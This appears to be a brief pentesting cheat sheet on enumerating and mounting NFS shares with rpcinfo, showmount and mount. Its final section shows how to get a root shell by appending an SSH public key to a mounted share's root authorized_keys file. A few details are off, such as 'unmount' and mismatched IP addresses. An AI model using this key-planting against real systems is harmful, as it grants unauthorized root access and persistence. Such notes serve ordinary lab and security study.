## Network File System (NFS)
- allows remote access to files over a network
- open standard anybody can implement

### Enumerationg with RPCinfo
Gives services and nfs shares of target
```shell
rpcinfo -p <target-ip>
```

### Showmount
Shows all the shares that are available on the target
```shell
showmount -e <target-ip>
```

### Mounting
```shell
mount -t nfs <target-ip>:/<share> <mount-point>
# mount point is where the share should be mounted to
```

#### Example
```shell
mount -t nfs 192.254.2.35:/ /mnt/nfs
```

### Get Shell over NFS
```shell
#1. create SSH key on local machine
ssh-keygen  
#2. put ssh key to authorized keys at mounted file system
cat ~/.ssh/id_rsa.pub >> ~/mnt/nfs/root/.ssh/authorized_keys #>> appends to file
#3 unmount the share
unmount /mnt/nfs
#4. ssh into it machine
ssh root@192.253.1.35 
```